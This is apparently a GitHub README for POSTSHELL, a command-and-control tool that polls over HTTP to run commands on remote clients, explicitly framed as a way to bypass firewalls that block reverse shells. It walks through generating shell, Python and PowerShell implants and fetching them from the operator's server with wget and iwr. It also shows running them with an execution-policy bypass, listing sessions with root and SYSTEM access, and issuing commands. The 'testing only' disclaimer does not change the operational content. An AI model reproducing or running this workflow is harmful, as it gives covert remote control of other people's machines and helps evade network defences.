```
██████╗  ██████╗ ███████╗████████╗███████╗██╗  ██╗███████╗██╗     ██╗     
██╔══██╗██╔═══██╗██╔════╝╚══██╔══╝██╔════╝██║  ██║██╔════╝██║     ██║     
██████╔╝██║   ██║███████╗   ██║   ███████╗███████║█████╗  ██║     ██║     
██╔═══╝ ██║   ██║╚════██║   ██║   ╚════██║██╔══██║██╔══╝  ██║     ██║     
██║     ╚██████╔╝███████║   ██║   ███████║██║  ██║███████╗███████╗███████╗
╚═╝      ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```
Execute commands on clients using GET/POST requests. (Bypass Firewalls)

There are some limitations, however, can be very useful if firewall is blocking standard reverse shells.

How postshell works:
  - POSTSHELL listens on a "USER SPECIFIED PORT"
  - POSTSHELL generates web request scripts `(sh, py, ps1)` for clients
  - POSTSHELL creates a directory called `tools/`, where it will place the "CLIENT SCRIPTS". `tools/` is a directory that can be downloaded from
    - (EX: http://127.0.0.1/tools/127_0_0_1_80.sh) 
  - Client scripts submit SYSTEM info using `POST` requests
  - Client scripts will continue to `GET` commands from the POSTSHELL server, execute the commands, then `POST` results back to the server
  - POSTSHELL keeps session logs for each client in `session_logs/`

# Disclaimer
This is only for testing purposes, not intended for anything illegal.

# Getting Started
Download POSTSHELL
```
git clone https://github.com/bwithe/postshell
```

# Usage
To start the server
```
python3 postshell.py <port>
```

List commands
```
postshell> help 

Menu Commands:
    help | ?            - Show this menu
    list                - List connected sessions
    select <id>         - Connect to a session
    kill <id>           - Terminate session
    exit                - Exit the server
Session Commands:
    background          - Background session
    die                 - Terminate session
Payload Menu Commands:
    set lhost <ip>      - Set the POSTSHELL IP address
    set lport <port>    - Set the POSTSHELL listening port
    set payload <type>  - Set payload type (EX: sh, py, ps1)
    set checkin <sec>   - Set the check-in wait time (in seconds)
    options             - Show current payload configuration
    generate            - Generate the payload with current settings
    back                - Return to the main menu
    help                - Show this help menu 
```

Generate a Client script that creates a directory called "tools" with the scripts
    - This server also allows `GET` requests from `tools/`
    - You can also store other tools needed (ex: winpeas, linpeas, sharphound, etc)
```
postshell> payload 
payload> options 

Current Payload Options:

  LHOST     : 127.0.0.1
  LPORT     : 80
  PAYLOAD   : sh
  CHECKIN   : 1

payload> set lhost 127.0.0.1
[+] Set lhost to 127.0.0.1
payload> set lport 80
[+] Set lport to 80
payload> set payload sh
[+] Set payload to sh
payload> set checkin 1
[+] Set checkin to 1
payload> generate 
[+] Payload generated and saved as tools/127_0_0_1_80.sh
```

Transfer the client script
```
wget http://127.0.0.1/tools/127_0_0_1_80.sh

iwr http://127.0.0.1/tools/127_0_0_1_80.ps1 -outfile 127_0_0_1_80.ps1
```

Execute the script on the client
```
bash 127_0_0_1_80.sh

python3 127_0_0_1_80.py

powershell -ep bypass 127_0_0_1_80.ps1
```

To see active clients
```
postshell> list 
╔════╦═════════════════╦═════════════════╦═════════╦════════════════╦══════════════════╦════════╗
║ ID ║ IP              ║ HOSTNAME        ║ USER    ║ OS             ║ VERSION          ║ ARCH   ║
╠════╬═════════════════╬═════════════════╬═════════╬════════════════╬══════════════════╬════════╣
║ 1  ║ 192.168.193.131 ║ ubuntu          ║ clyde   ║ Linux          ║ 6.8.0-41-generic ║ x86_64 ║
║ 2  ║ 192.168.193.131 ║ ubuntu          ║ root    ║ Linux          ║ 6.8.0-41-generic ║ x86_64 ║
║ 3  ║ 192.168.193.129 ║ DESKTOP-P5KACDB ║ jimothy ║ Windows 10 Pro ║ 10.0.19045       ║ 64-bit ║
║ 4  ║ 192.168.193.129 ║ DESKTOP-P5KACDB ║ system  ║ Windows 10 Pro ║ 10.0.19045       ║ 64-bit ║
╚════╩═════════════════╩═════════════════╩═════════╩════════════════╩══════════════════╩════════╝

postshell> list 
╔════╦═════════════╦═══════════╦════════╦══════════════════════════════╦════════════╦════════╗
║ ID ║ IP          ║ HOSTNAME  ║ USER   ║ OS                           ║ VERSION    ║ ARCH   ║
╠════╬═════════════╬═══════════╬════════╬══════════════════════════════╬════════════╬════════╣
║ 1  ║ 172.16.12.5 ║ SKYWALKER ║ luke   ║ Windows 11 Pro               ║ 10.0.26100 ║ 64-bit ║
║ 2  ║ 172.16.12.2 ║ WOOKIE    ║ chewie ║ Windows 11 Pro               ║ 10.0.26100 ║ 64-bit ║
║ 3  ║ 172.16.12.4 ║ SOLO      ║ han    ║ Windows Server 2025 Standard ║ 10.0.26100 ║ 64-bit ║
╚════╩═════════════╩═══════════╩════════╩══════════════════════════════╩════════════╩════════╝
```

To connect to an active session
```
postshell> select 1
[luke@SKYWALKER]> 
```

Execute commands, and wait for the client to GET the command, then POST the results
```
[luke@SKYWALKER]> pwd

Path         
----         
C:\Users\Luke

```
  
Background a session
```
[luke@SKYWALKER]> background
```

Kill the current session
```
[chewie@WOOKIE]> die 
[!] Sent die command to chewie@WOOKIE
```

Kill an active session from the menu
```
postshell> kill 1
[!] Sent kill command to luke@SKYWALKER
```

Kill all sessions, and exit POSTSHELL
```
postshell> exit 
[!] Shutting down server and all sessions.
```
